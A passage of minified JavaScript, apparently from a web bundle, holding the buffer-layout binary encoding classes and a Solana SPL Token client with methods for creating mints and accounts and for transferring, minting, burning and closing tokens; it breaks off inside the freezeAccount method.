            decode(e, t) {
                return void 0 === t && (t = 0), e.readUIntBE(t, this.span)
            }
            encode(e, t, n) {
                return void 0 === n && (n = 0), t.writeUIntBE(e, n, this.span), this.span
            }
        }
        class ea extends Qs {
            constructor(e, t) {
                if (super(e, t), 6 < this.span) throw new RangeError("span must not exceed 6 bytes")
            }
            decode(e, t) {
                return void 0 === t && (t = 0), e.readIntLE(t, this.span)
            }
            encode(e, t, n) {
                return void 0 === n && (n = 0), t.writeIntLE(e, n, this.span), this.span
            }
        }
        class ta extends Qs {
            constructor(e, t) {
                if (super(e, t), 6 < this.span) throw new RangeError("span must not exceed 6 bytes")
            }
            decode(e, t) {
                return void 0 === t && (t = 0), e.readIntBE(t, this.span)
            }
            encode(e, t, n) {
                return void 0 === n && (n = 0), t.writeIntBE(e, n, this.span), this.span
            }
        }
        const na = Math.pow(2, 32);

        function ra(e) {
            const t = Math.floor(e / na);
            return {
                hi32: t,
                lo32: e - t * na
            }
        }

        function ia(e, t) {
            return e * na + t
        }
        class oa extends Qs {
            constructor(e) {
                super(8, e)
            }
            decode(e, t) {
                void 0 === t && (t = 0);
                const n = e.readUInt32LE(t);
                return ia(e.readUInt32LE(t + 4), n)
            }
            encode(e, t, n) {
                void 0 === n && (n = 0);
                const r = ra(e);
                return t.writeUInt32LE(r.lo32, n), t.writeUInt32LE(r.hi32, n + 4), 8
            }
        }
        class sa extends Qs {
            constructor(e) {
                super(8, e)
            }
            decode(e, t) {
                void 0 === t && (t = 0);
                return ia(e.readUInt32BE(t), e.readUInt32BE(t + 4))
            }
            encode(e, t, n) {
                void 0 === n && (n = 0);
                const r = ra(e);
                return t.writeUInt32BE(r.hi32, n), t.writeUInt32BE(r.lo32, n + 4), 8
            }
        }
        class aa extends Qs {
            constructor(e) {
                super(8, e)
            }
            decode(e, t) {
                void 0 === t && (t = 0);
                const n = e.readUInt32LE(t);
                return ia(e.readInt32LE(t + 4), n)
            }
            encode(e, t, n) {
                void 0 === n && (n = 0);
                const r = ra(e);
                return t.writeUInt32LE(r.lo32, n), t.writeInt32LE(r.hi32, n + 4), 8
            }
        }
        class ua extends Qs {
            constructor(e) {
                super(8, e)
            }
            decode(e, t) {
                void 0 === t && (t = 0);
                return ia(e.readInt32BE(t), e.readUInt32BE(t + 4))
            }
            encode(e, t, n) {
                void 0 === n && (n = 0);
                const r = ra(e);
                return t.writeInt32BE(r.hi32, n), t.writeUInt32BE(r.lo32, n + 4), 8
            }
        }
        class ca extends Qs {
            constructor(e) {
                super(4, e)
            }
            decode(e, t) {
                return void 0 === t && (t = 0), e.readFloatLE(t)
            }
            encode(e, t, n) {
                return void 0 === n && (n = 0), t.writeFloatLE(e, n), 4
            }
        }
        class la extends Qs {
            constructor(e) {
                super(4, e)
            }
            decode(e, t) {
                return void 0 === t && (t = 0), e.readFloatBE(t)
            }
            encode(e, t, n) {
                return void 0 === n && (n = 0), t.writeFloatBE(e, n), 4
            }
        }
        class fa extends Qs {
            constructor(e) {
                super(8, e)
            }
            decode(e, t) {
                return void 0 === t && (t = 0), e.readDoubleLE(t)
            }
            encode(e, t, n) {
                return void 0 === n && (n = 0), t.writeDoubleLE(e, n), 8
            }
        }
        class ha extends Qs {
            constructor(e) {
                super(8, e)
            }
            decode(e, t) {
                return void 0 === t && (t = 0), e.readDoubleBE(t)
            }
            encode(e, t, n) {
                return void 0 === n && (n = 0), t.writeDoubleBE(e, n), 8
            }
        }
        class da extends Qs {
            constructor(e, t, n) {
                if (!(e instanceof Qs)) throw new TypeError("elementLayout must be a Layout");
                if (!(t instanceof Ys && t.isCount() || Number.isInteger(t) && 0 <= t)) throw new TypeError("count must be non-negative integer or an unsigned integer ExternalLayout");
                let r = -1;
                !(t instanceof Ys) && 0 < e.span && (r = t * e.span), super(r, n), this.elementLayout = e, this.count = t
            }
            getSpan(e, t) {
                if (0 <= this.span) return this.span;
                void 0 === t && (t = 0);
                let n = 0,
                    r = this.count;
                if (r instanceof Ys && (r = r.decode(e, t)), 0 < this.elementLayout.span) n = r * this.elementLayout.span;
                else {
                    let i = 0;
                    for (; i < r;) n += this.elementLayout.getSpan(e, t + n), ++i
                }
                return n
            }
            decode(e, t) {
                void 0 === t && (t = 0);
                const n = [];
                let r = 0,
                    i = this.count;
                for (i instanceof Ys && (i = i.decode(e, t)); r < i;) n.push(this.elementLayout.decode(e, t)), t += this.elementLayout.getSpan(e, t), r += 1;
                return n
            }
            encode(e, t, n) {
                void 0 === n && (n = 0);
                const r = this.elementLayout,
                    i = e.reduce(((e, i) => e + r.encode(i, t, n + e)), 0);
                return this.count instanceof Ys && this.count.encode(e.length, t, n), i
            }
        }
        class pa extends Qs {
            constructor(e, t, n) {
                if (!Array.isArray(e) || !e.reduce(((e, t) => e && t instanceof Qs), !0)) throw new TypeError("fields must be array of Layout instances");
                "boolean" === typeof t && void 0 === n && (n = t, t = void 0);
                for (const o of e)
                    if (0 > o.span && void 0 === o.property) throw new Error("fields cannot contain unnamed variable-length layout");
                let r = -1;
                try {
                    r = e.reduce(((e, t) => e + t.getSpan()), 0)
                } catch (i) {}
                super(r, t), this.fields = e, this.decodePrefixes = !!n
            }
            getSpan(e, t) {
                if (0 <= this.span) return this.span;
                void 0 === t && (t = 0);
                let n = 0;
                try {
                    n = this.fields.reduce(((n, r) => {
                        const i = r.getSpan(e, t);
                        return t += i, n + i
                    }), 0)
                } catch (r) {
                    throw new RangeError("indeterminate span")
                }
                return n
            }
            decode(e, t) {
                void 0 === t && (t = 0);
                const n = this.makeDestinationObject();
                for (const r of this.fields)
                    if (void 0 !== r.property && (n[r.property] = r.decode(e, t)), t += r.getSpan(e, t), this.decodePrefixes && e.length === t) break;
                return n
            }
            encode(e, t, n) {
                void 0 === n && (n = 0);
                const r = n;
                let i = 0,
                    o = 0;
                for (const s of this.fields) {
                    let r = s.span;
                    if (o = 0 < r ? r : 0, void 0 !== s.property) {
                        const i = e[s.property];
                        void 0 !== i && (o = s.encode(i, t, n), 0 > r && (r = s.getSpan(t, n)))
                    }
                    i = n, n += r
                }
                return i + o - r
            }
            fromArray(e) {
                const t = this.makeDestinationObject();
                for (const n of this.fields) void 0 !== n.property && 0 < e.length && (t[n.property] = e.shift());
                return t
            }
            layoutFor(e) {
                if ("string" !== typeof e) throw new TypeError("property must be string");
                for (const t of this.fields)
                    if (t.property === e) return t
            }
            offsetOf(e) {
                if ("string" !== typeof e) throw new TypeError("property must be string");
                let t = 0;
                for (const n of this.fields) {
                    if (n.property === e) return t;
                    0 > n.span ? t = -1 : 0 <= t && (t += n.span)
                }
            }
        }
        class ya {
            constructor(e) {
                this.property = e
            }
            decode() {
                throw new Error("UnionDiscriminator is abstract")
            }
            encode() {
                throw new Error("UnionDiscriminator is abstract")
            }
        }
        class ga extends ya {
            constructor(e, t) {
                if (!(e instanceof Ys && e.isCount())) throw new TypeError("layout must be an unsigned integer ExternalLayout");
                super(t || e.property || "variant"), this.layout = e
            }
            decode(e, t) {
                return this.layout.decode(e, t)
            }
            encode(e, t, n) {
                return this.layout.encode(e, t, n)
            }
        }
        class ma extends Qs {
            constructor(e, t, n) {
                const r = e instanceof Xs || e instanceof $s;
                if (r) e = new ga(new Js(e));
                else if (e instanceof Ys && e.isCount()) e = new ga(e);
                else if (!(e instanceof ya)) throw new TypeError("discr must be a UnionDiscriminator or an unsigned integer layout");
                if (void 0 === t && (t = null), !(null === t || t instanceof Qs)) throw new TypeError("defaultLayout must be null or a Layout");
                if (null !== t) {
                    if (0 > t.span) throw new Error("defaultLayout must have constant span");
                    void 0 === t.property && (t = t.replicate("content"))
                }
                let i = -1;
                t && (i = t.span, 0 <= i && r && (i += e.layout.span)), super(i, n), this.discriminator = e, this.usesPrefixDiscriminator = r, this.defaultLayout = t, this.registry = {};
                let o = this.defaultGetSourceVariant.bind(this);
                this.getSourceVariant = function(e) {
                    return o(e)
                }, this.configGetSourceVariant = function(e) {
                    o = e.bind(this)
                }
            }
            getSpan(e, t) {
                if (0 <= this.span) return this.span;
                void 0 === t && (t = 0);
                const n = this.getVariant(e, t);
                if (!n) throw new Error("unable to determine span for unrecognized variant");
                return n.getSpan(e, t)
            }
            defaultGetSourceVariant(e) {
                if (e.hasOwnProperty(this.discriminator.property)) {
                    if (this.defaultLayout && e.hasOwnProperty(this.defaultLayout.property)) return;
                    const t = this.registry[e[this.discriminator.property]];
                    if (t && (!t.layout || e.hasOwnProperty(t.property))) return t
                } else
                    for (const t in this.registry) {
                        const n = this.registry[t];
                        if (e.hasOwnProperty(n.property)) return n
                    }
                throw new Error("unable to infer src variant")
            }
            decode(e, t) {
                let n;
                void 0 === t && (t = 0);
                const r = this.discriminator,
                    i = r.decode(e, t);
                let o = this.registry[i];
                if (void 0 === o) {
                    let s = 0;
                    o = this.defaultLayout, this.usesPrefixDiscriminator && (s = r.layout.span), n = this.makeDestinationObject(), n[r.property] = i, n[o.property] = this.defaultLayout.decode(e, t + s)
                } else n = o.decode(e, t);
                return n
            }
            encode(e, t, n) {
                void 0 === n && (n = 0);
                const r = this.getSourceVariant(e);
                if (void 0 === r) {
                    const r = this.discriminator,
                        i = this.defaultLayout;
                    let o = 0;
                    return this.usesPrefixDiscriminator && (o = r.layout.span), r.encode(e[r.property], t, n), o + i.encode(e[i.property], t, n + o)
                }
                return r.encode(e, t, n)
            }
            addVariant(e, t, n) {
                const r = new wa(this, e, t, n);
                return this.registry[e] = r, r
            }
            getVariant(e, t) {
                let n = e;
                return Go.Buffer.isBuffer(e) && (void 0 === t && (t = 0), n = this.discriminator.decode(e, t)), this.registry[n]
            }
        }
        class wa extends Qs {
            constructor(e, t, n, r) {
                if (!(e instanceof ma)) throw new TypeError("union must be a Union");
                if (!Number.isInteger(t) || 0 > t) throw new TypeError("variant must be a (non-negative) integer");
                if ("string" === typeof n && void 0 === r && (r = n, n = null), n) {
                    if (!(n instanceof Qs)) throw new TypeError("layout must be a Layout");
                    if (null !== e.defaultLayout && 0 <= n.span && n.span > e.defaultLayout.span) throw new Error("variant span exceeds span of containing union");
                    if ("string" !== typeof r) throw new TypeError("variant must have a String property")
                }
                let i = e.span;
                0 > e.span && (i = n ? n.span : 0, 0 <= i && e.usesPrefixDiscriminator && (i += e.discriminator.layout.span)), super(i, r), this.union = e, this.variant = t, this.layout = n || null
            }
            getSpan(e, t) {
                if (0 <= this.span) return this.span;
                void 0 === t && (t = 0);
                let n = 0;
                return this.union.usesPrefixDiscriminator && (n = this.union.discriminator.layout.span), n + this.layout.getSpan(e, t + n)
            }
            decode(e, t) {
                const n = this.makeDestinationObject();
                if (void 0 === t && (t = 0), this !== this.union.getVariant(e, t)) throw new Error("variant mismatch");
                let r = 0;
                return this.union.usesPrefixDiscriminator && (r = this.union.discriminator.layout.span), this.layout ? n[this.property] = this.layout.decode(e, t + r) : this.property ? n[this.property] = !0 : this.union.usesPrefixDiscriminator && (n[this.union.discriminator.property] = this.variant), n
            }
            encode(e, t, n) {
                void 0 === n && (n = 0);
                let r = 0;
                if (this.union.usesPrefixDiscriminator && (r = this.union.discriminator.layout.span), this.layout && !e.hasOwnProperty(this.property)) throw new TypeError("variant lacks property " + this.property);
                this.union.discriminator.encode(this.variant, t, n);
                let i = r;
                if (this.layout && (this.layout.encode(e[this.property], t, n + r), i += this.layout.getSpan(t, n + r), 0 <= this.union.span && i > this.union.span)) throw new Error("encoded variant overruns containing union");
                return i
            }
            fromArray(e) {
                if (this.layout) return this.layout.fromArray(e)
            }
        }

        function ba(e) {
            return 0 > e && (e += 4294967296), e
        }
        class va extends Qs {
            constructor(e, t, n) {
                if (!(e instanceof Xs || e instanceof $s)) throw new TypeError("word must be a UInt or UIntBE layout");
                if ("string" === typeof t && void 0 === n && (n = t, t = void 0), 4 < e.span) throw new RangeError("word cannot exceed 32 bits");
                super(e.span, n), this.word = e, this.msb = !!t, this.fields = [];
                let r = 0;
                this._packedSetValue = function(e) {
                    return r = ba(e), this
                }, this._packedGetValue = function() {
                    return r
                }
            }
            decode(e, t) {
                const n = this.makeDestinationObject();
                void 0 === t && (t = 0);
                const r = this.word.decode(e, t);
                this._packedSetValue(r);
                for (const i of this.fields) void 0 !== i.property && (n[i.property] = i.decode(r));
                return n
            }
            encode(e, t, n) {
                void 0 === n && (n = 0);
                const r = this.word.decode(t, n);
                this._packedSetValue(r);
                for (const i of this.fields)
                    if (void 0 !== i.property) {
                        const t = e[i.property];
                        void 0 !== t && i.encode(t)
                    }
                return this.word.encode(this._packedGetValue(), t, n)
            }
            addField(e, t) {
                const n = new Aa(this, e, t);
                return this.fields.push(n), n
            }
            addBoolean(e) {
                const t = new ka(this, e);
                return this.fields.push(t), t
            }
            fieldFor(e) {
                if ("string" !== typeof e) throw new TypeError("property must be string");
                for (const t of this.fields)
                    if (t.property === e) return t
            }
        }
        class Aa {
            constructor(e, t, n) {
                if (!(e instanceof va)) throw new TypeError("container must be a BitStructure");
                if (!Number.isInteger(t) || 0 >= t) throw new TypeError("bits must be positive integer");
                const r = 8 * e.span,
                    i = e.fields.reduce(((e, t) => e + t.bits), 0);
                if (t + i > r) throw new Error("bits too long for span remainder (" + (r - i) + " of " + r + " remain)");
                this.container = e, this.bits = t, this.valueMask = (1 << t) - 1, 32 === t && (this.valueMask = 4294967295), this.start = i, this.container.msb && (this.start = r - i - t), this.wordMask = ba(this.valueMask << this.start), this.property = n
            }
            decode() {
                return ba(this.container._packedGetValue() & this.wordMask) >>> this.start
            }
            encode(e) {
                if (!Number.isInteger(e) || e !== ba(e & this.valueMask)) throw new TypeError(Gs("BitField.encode", this) + " value must be integer not exceeding " + this.valueMask);
                const t = this.container._packedGetValue(),
                    n = ba(e << this.start);
                this.container._packedSetValue(ba(t & ~this.wordMask) | n)
            }
        }
        class ka extends Aa {
            constructor(e, t) {
                super(e, 1, t)
            }
            decode(e, t) {
                return !!Aa.prototype.decode.call(this, e, t)
            }
            encode(e) {
                return "boolean" === typeof e && (e = +e), Aa.prototype.encode.call(this, e)
            }
        }
        class _a extends Qs {
            constructor(e, t) {
                if (!(e instanceof Ys && e.isCount() || Number.isInteger(e) && 0 <= e)) throw new TypeError("length must be positive integer or an unsigned integer ExternalLayout");
                let n = -1;
                e instanceof Ys || (n = e), super(n, t), this.length = e
            }
            getSpan(e, t) {
                let n = this.span;
                return 0 > n && (n = this.length.decode(e, t)), n
            }
            decode(e, t) {
                void 0 === t && (t = 0);
                let n = this.span;
                return 0 > n && (n = this.length.decode(e, t)), e.slice(t, t + n)
            }
            encode(e, t, n) {
                let r = this.length;
                if (this.length instanceof Ys && (r = e.length), !Go.Buffer.isBuffer(e) || r !== e.length) throw new TypeError(Gs("Blob.encode", this) + " requires (length " + r + ") Buffer as src");
                if (n + r > t.length) throw new RangeError("encoding overruns Buffer");
                return t.write(e.toString("hex"), n, r, "hex"), this.length instanceof Ys && this.length.encode(r, t, n), r
            }
        }
        class Ea extends Qs {
            constructor(e) {
                super(-1, e)
            }
            getSpan(e, t) {
                if (!Go.Buffer.isBuffer(e)) throw new TypeError("b must be a Buffer");
                void 0 === t && (t = 0);
                let n = t;
                for (; n < e.length && 0 !== e[n];) n += 1;
                return 1 + n - t
            }
            decode(e, t, n) {
                void 0 === t && (t = 0);
                let r = this.getSpan(e, t);
                return e.slice(t, t + r - 1).toString("utf-8")
            }
            encode(e, t, n) {
                void 0 === n && (n = 0), "string" !== typeof e && (e = e.toString());
                const r = new Go.Buffer(e, "utf8"),
                    i = r.length;
                if (n + i > t.length) throw new RangeError("encoding overruns Buffer");
                return r.copy(t, n), t[n + i] = 0, i + 1
            }
        }
        class Sa extends Qs {
            constructor(e, t) {
                if ("string" === typeof e && void 0 === t && (t = e, e = void 0), void 0 === e) e = -1;
                else if (!Number.isInteger(e)) throw new TypeError("maxSpan must be an integer");
                super(-1, t), this.maxSpan = e
            }
            getSpan(e, t) {
                if (!Go.Buffer.isBuffer(e)) throw new TypeError("b must be a Buffer");
                return void 0 === t && (t = 0), e.length - t
            }
            decode(e, t, n) {
                void 0 === t && (t = 0);
                let r = this.getSpan(e, t);
                if (0 <= this.maxSpan && this.maxSpan < r) throw new RangeError("text length exceeds maxSpan");
                return e.slice(t, t + r).toString("utf-8")
            }
            encode(e, t, n) {
                void 0 === n && (n = 0), "string" !== typeof e && (e = e.toString());
                const r = new Go.Buffer(e, "utf8"),
                    i = r.length;
                if (0 <= this.maxSpan && this.maxSpan < i) throw new RangeError("text length exceeds maxSpan");
                if (n + i > t.length) throw new RangeError("encoding overruns Buffer");
                return r.copy(t, n), i
            }
        }
        class Ia extends Qs {
            constructor(e, t) {
                super(0, t), this.value = e
            }
            decode(e, t, n) {
                return this.value
            }
            encode(e, t, n) {
                return 0
            }
        }
        Vs.ExternalLayout = Ys, Vs.GreedyCount = Zs, Vs.OffsetLayout = Js, Vs.UInt = Xs, Vs.UIntBE = $s, Vs.Int = ea, Vs.IntBE = ta, Vs.Float = ca, Vs.FloatBE = la, Vs.Double = fa, Vs.DoubleBE = ha, Vs.Sequence = da, Vs.Structure = pa, Vs.UnionDiscriminator = ya, Vs.UnionLayoutDiscriminator = ga, Vs.Union = ma, Vs.VariantLayout = wa, Vs.BitStructure = va, Vs.BitField = Aa, Vs.Boolean = ka, Vs.Blob = _a, Vs.CString = Ea, Vs.UTF8 = Sa, Vs.Constant = Ia, Vs.greedy = (e, t) => new Zs(e, t), Vs.offset = (e, t, n) => new Js(e, t, n);
        var xa = Vs.u8 = e => new Xs(1, e);
        Vs.u16 = e => new Xs(2, e), Vs.u24 = e => new Xs(3, e);
        var Ma = Vs.u32 = e => new Xs(4, e);
        Vs.u40 = e => new Xs(5, e), Vs.u48 = e => new Xs(6, e), Vs.nu64 = e => new oa(e), Vs.u16be = e => new $s(2, e), Vs.u24be = e => new $s(3, e), Vs.u32be = e => new $s(4, e), Vs.u40be = e => new $s(5, e), Vs.u48be = e => new $s(6, e), Vs.nu64be = e => new sa(e), Vs.s8 = e => new ea(1, e), Vs.s16 = e => new ea(2, e), Vs.s24 = e => new ea(3, e), Vs.s32 = e => new ea(4, e), Vs.s40 = e => new ea(5, e), Vs.s48 = e => new ea(6, e), Vs.ns64 = e => new aa(e), Vs.s16be = e => new ta(2, e), Vs.s24be = e => new ta(3, e), Vs.s32be = e => new ta(4, e), Vs.s40be = e => new ta(5, e), Vs.s48be = e => new ta(6, e), Vs.ns64be = e => new ua(e), Vs.f32 = e => new ca(e), Vs.f32be = e => new la(e), Vs.f64 = e => new fa(e), Vs.f64be = e => new ha(e);
        var Ba = Vs.struct = (e, t, n) => new pa(e, t, n);
        Vs.bits = (e, t, n) => new va(e, t, n), Vs.seq = (e, t, n) => new da(e, t, n), Vs.union = (e, t, n) => new ma(e, t, n), Vs.unionLayoutDiscriminator = (e, t) => new ga(e, t);
        var Ta = Vs.blob = (e, t) => new _a(e, t);
        Vs.cstr = e => new Ea(e), Vs.utf8 = (e, t) => new Sa(e, t), Vs.const = (e, t) => new Ia(e, t);
        const Oa = function() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "publicKey";
                return Ta(32, e)
            },
            Ca = function() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "uint64";
                return Ta(8, e)
            };

        function Pa(e, t, n) {
            for (var r = arguments.length, i = new Array(r > 3 ? r - 3 : 0), o = 3; o < r; o++) i[o - 3] = arguments[o];
            return (0, _.sendAndConfirmTransaction)(t, n, i, {
                skipPreflight: !1
            })
        }
        const La = new _.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
            Na = new _.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"),
            Ra = "Failed to find account",
            Da = "Invalid account owner";

        function za(e) {
            return Go.Buffer.from(e.toBuffer())
        }
        class Ua extends(we()) {
            toBuffer() {
                const e = super.toArray().reverse(),
                    t = Go.Buffer.from(e);
                if (8 === t.length) return t;
                Ls(t.length < 8, "u64 too large");
                const n = Go.Buffer.alloc(8);
                return t.copy(n), n
            }
            static fromBuffer(e) {
                return Ls(8 === e.length, `Invalid buffer length: ${e.length}`), new Ua([...e].reverse().map((e => `00${e.toString(16)}`.slice(-2))).join(""), 16)
            }
        }

        function ja(e) {
            return "publicKey" in e
        }
        const Fa = {
                MintTokens: 0,
                FreezeAccount: 1,
                AccountOwner: 2,
                CloseAccount: 3
            },
            Ha = new _.PublicKey("So11111111111111111111111111111111111111112"),
            Wa = Ba([Ma("mintAuthorityOption"), Oa("mintAuthority"), Ca("supply"), xa("decimals"), xa("isInitialized"), Ma("freezeAuthorityOption"), Oa("freezeAuthority")]),
            Ka = Ba([Oa("mint"), Oa("owner"), Ca("amount"), Ma("delegateOption"), Oa("delegate"), xa("state"), Ma("isNativeOption"), Ca("isNative"), Ca("delegatedAmount"), Ma("closeAuthorityOption"), Oa("closeAuthority")]),
            qa = Ba([xa("m"), xa("n"), xa("is_initialized"), Oa("signer1"), Oa("signer2"), Oa("signer3"), Oa("signer4"), Oa("signer5"), Oa("signer6"), Oa("signer7"), Oa("signer8"), Oa("signer9"), Oa("signer10"), Oa("signer11")]);
        class Va {
            constructor(e, t, n, r) {
                (0, Qo.Z)(this, "connection", void 0), (0, Qo.Z)(this, "publicKey", void 0), (0, Qo.Z)(this, "programId", void 0), (0, Qo.Z)(this, "associatedProgramId", void 0), (0, Qo.Z)(this, "payer", void 0), Object.assign(this, {
                    connection: e,
                    publicKey: t,
                    programId: n,
                    payer: r,
                    associatedProgramId: Na
                })
            }
            static async getMinBalanceRentForExemptMint(e) {
                return await e.getMinimumBalanceForRentExemption(Wa.span)
            }
            static async getMinBalanceRentForExemptAccount(e) {
                return await e.getMinimumBalanceForRentExemption(Ka.span)
            }
            static async getMinBalanceRentForExemptMultisig(e) {
                return await e.getMinimumBalanceForRentExemption(qa.span)
            }
            static async createMint(e, t, n, r, i, o) {
                const s = _.Keypair.generate(),
                    a = new Va(e, s.publicKey, o, t),
                    u = await Va.getMinBalanceRentForExemptMint(e),
                    c = new _.Transaction;
                return c.add(_.SystemProgram.createAccount({
                    fromPubkey: t.publicKey,
                    newAccountPubkey: s.publicKey,
                    lamports: u,
                    space: Wa.span,
                    programId: o
                })), c.add(Va.createInitMintInstruction(o, s.publicKey, i, n, r)), await Pa("createAccount and InitializeMint", e, c, t, s), a
            }
            async createAccount(e) {
                const t = await Va.getMinBalanceRentForExemptAccount(this.connection),
                    n = _.Keypair.generate(),
                    r = new _.Transaction;
                r.add(_.SystemProgram.createAccount({
                    fromPubkey: this.payer.publicKey,
                    newAccountPubkey: n.publicKey,
                    lamports: t,
                    space: Ka.span,
                    programId: this.programId
                }));
                const i = this.publicKey;
                return r.add(Va.createInitAccountInstruction(this.programId, i, n.publicKey, e)), await Pa("createAccount and InitializeAccount", this.connection, r, this.payer, n), n.publicKey
            }
            async createAssociatedTokenAccount(e) {
                const t = await Va.getAssociatedTokenAddress(this.associatedProgramId, this.programId, this.publicKey, e);
                return this.createAssociatedTokenAccountInternal(e, t)
            }
            async createAssociatedTokenAccountInternal(e, t) {
                return await Pa("CreateAssociatedTokenAccount", this.connection, (new _.Transaction).add(Va.createAssociatedTokenAccountInstruction(this.associatedProgramId, this.programId, this.publicKey, t, e, this.payer.publicKey)), this.payer), t
            }
            async getOrCreateAssociatedAccountInfo(e) {
                const t = await Va.getAssociatedTokenAddress(this.associatedProgramId, this.programId, this.publicKey, e);
                try {
                    return await this.getAccountInfo(t)
                } catch (Vt) {
                    if (Vt.message === Ra || Vt.message === Da) {
                        try {
                            await this.createAssociatedTokenAccountInternal(e, t)
                        } catch (Vt) {}
                        return await this.getAccountInfo(t)
                    }
                    throw Vt
                }
            }
            static async createWrappedNativeAccount(e, t, n, r, i) {
                const o = await Va.getMinBalanceRentForExemptAccount(e),
                    s = _.Keypair.generate(),
                    a = new _.Transaction;
                return a.add(_.SystemProgram.createAccount({
                    fromPubkey: r.publicKey,
                    newAccountPubkey: s.publicKey,
                    lamports: o,
                    space: Ka.span,
                    programId: t
                })), a.add(_.SystemProgram.transfer({
                    fromPubkey: r.publicKey,
                    toPubkey: s.publicKey,
                    lamports: i
                })), a.add(Va.createInitAccountInstruction(t, Ha, s.publicKey, n)), await Pa("createAccount, transfer, and initializeAccount", e, a, r, s), s.publicKey
            }
            async createMultisig(e, t) {
                const n = _.Keypair.generate(),
                    r = await Va.getMinBalanceRentForExemptMultisig(this.connection),
                    i = new _.Transaction;
                i.add(_.SystemProgram.createAccount({
                    fromPubkey: this.payer.publicKey,
                    newAccountPubkey: n.publicKey,
                    lamports: r,
                    space: qa.span,
                    programId: this.programId
                }));
                let o = [{
                    pubkey: n.publicKey,
                    isSigner: !1,
                    isWritable: !0
                }, {
                    pubkey: _.SYSVAR_RENT_PUBKEY,
                    isSigner: !1,
                    isWritable: !1
                }];
                t.forEach((e => o.push({
                    pubkey: e,
                    isSigner: !1,
                    isWritable: !1
                })));
                const s = Ba([xa("instruction"), xa("m")]),
                    a = Go.Buffer.alloc(s.span);
                return s.encode({
                    instruction: 2,
                    m: e
                }, a), i.add({
                    keys: o,
                    programId: this.programId,
                    data: a
                }), await Pa("createAccount and InitializeMultisig", this.connection, i, this.payer, n), n.publicKey
            }
            async getMintInfo() {
                const e = await this.connection.getAccountInfo(this.publicKey);
                if (null === e) throw new Error("Failed to find mint account");
                if (!e.owner.equals(this.programId)) throw new Error(`Invalid mint owner: ${JSON.stringify(e.owner)}`);
                if (e.data.length != Wa.span) throw new Error("Invalid mint size");
                const t = Go.Buffer.from(e.data),
                    n = Wa.decode(t);
                return 0 === n.mintAuthorityOption ? n.mintAuthority = null : n.mintAuthority = new _.PublicKey(n.mintAuthority), n.supply = Ua.fromBuffer(n.supply), n.isInitialized = 0 != n.isInitialized, 0 === n.freezeAuthorityOption ? n.freezeAuthority = null : n.freezeAuthority = new _.PublicKey(n.freezeAuthority), n
            }
            async getAccountInfo(e, t) {
                const n = await this.connection.getAccountInfo(e, t);
                if (null === n) throw new Error(Ra);
                if (!n.owner.equals(this.programId)) throw new Error(Da);
                if (n.data.length != Ka.span) throw new Error("Invalid account size");
                const r = Go.Buffer.from(n.data),
                    i = Ka.decode(r);
                if (i.address = e, i.mint = new _.PublicKey(i.mint), i.owner = new _.PublicKey(i.owner), i.amount = Ua.fromBuffer(i.amount), 0 === i.delegateOption ? (i.delegate = null, i.delegatedAmount = new Ua) : (i.delegate = new _.PublicKey(i.delegate), i.delegatedAmount = Ua.fromBuffer(i.delegatedAmount)), i.isInitialized = 0 !== i.state, i.isFrozen = 2 === i.state, 1 === i.isNativeOption ? (i.rentExemptReserve = Ua.fromBuffer(i.isNative), i.isNative = !0) : (i.rentExemptReserve = null, i.isNative = !1), 0 === i.closeAuthorityOption ? i.closeAuthority = null : i.closeAuthority = new _.PublicKey(i.closeAuthority), !i.mint.equals(this.publicKey)) throw new Error(`Invalid account mint: ${JSON.stringify(i.mint)} !== ${JSON.stringify(this.publicKey)}`);
                return i
            }
            async getMultisigInfo(e) {
                const t = await this.connection.getAccountInfo(e);
                if (null === t) throw new Error("Failed to find multisig");
                if (!t.owner.equals(this.programId)) throw new Error("Invalid multisig owner");
                if (t.data.length != qa.span) throw new Error("Invalid multisig size");
                const n = Go.Buffer.from(t.data),
                    r = qa.decode(n);
                return r.signer1 = new _.PublicKey(r.signer1), r.signer2 = new _.PublicKey(r.signer2), r.signer3 = new _.PublicKey(r.signer3), r.signer4 = new _.PublicKey(r.signer4), r.signer5 = new _.PublicKey(r.signer5), r.signer6 = new _.PublicKey(r.signer6), r.signer7 = new _.PublicKey(r.signer7), r.signer8 = new _.PublicKey(r.signer8), r.signer9 = new _.PublicKey(r.signer9), r.signer10 = new _.PublicKey(r.signer10), r.signer11 = new _.PublicKey(r.signer11), r
            }
            async transfer(e, t, n, r, i) {
                let o, s;
                return ja(n) ? (o = n.publicKey, s = [n]) : (o = n, s = r), await Pa("Transfer", this.connection, (new _.Transaction).add(Va.createTransferInstruction(this.programId, e, t, o, r, i)), this.payer, ...s)
            }
            async approve(e, t, n, r, i) {
                let o, s;
                ja(n) ? (o = n.publicKey, s = [n]) : (o = n, s = r), await Pa("Approve", this.connection, (new _.Transaction).add(Va.createApproveInstruction(this.programId, e, t, o, r, i)), this.payer, ...s)
            }
            async revoke(e, t, n) {
                let r, i;
                ja(t) ? (r = t.publicKey, i = [t]) : (r = t, i = n), await Pa("Revoke", this.connection, (new _.Transaction).add(Va.createRevokeInstruction(this.programId, e, r, n)), this.payer, ...i)
            }
            async setAuthority(e, t, n, r, i) {
                let o, s;
                ja(r) ? (o = r.publicKey, s = [r]) : (o = r, s = i), await Pa("SetAuthority", this.connection, (new _.Transaction).add(Va.createSetAuthorityInstruction(this.programId, e, t, n, o, i)), this.payer, ...s)
            }
            async mintTo(e, t, n, r) {
                let i, o;
                ja(t) ? (i = t.publicKey, o = [t]) : (i = t, o = n), await Pa("MintTo", this.connection, (new _.Transaction).add(Va.createMintToInstruction(this.programId, this.publicKey, e, i, n, r)), this.payer, ...o)
            }
            async burn(e, t, n, r) {
                let i, o;
                ja(t) ? (i = t.publicKey, o = [t]) : (i = t, o = n), await Pa("Burn", this.connection, (new _.Transaction).add(Va.createBurnInstruction(this.programId, this.publicKey, e, i, n, r)), this.payer, ...o)
            }
            async closeAccount(e, t, n, r) {
                let i, o;
                ja(n) ? (i = n.publicKey, o = [n]) : (i = n, o = r), await Pa("CloseAccount", this.connection, (new _.Transaction).add(Va.createCloseAccountInstruction(this.programId, e, t, i, r)), this.payer, ...o)
            }
            async freezeAccount(e, t, n) {
                let r, i;
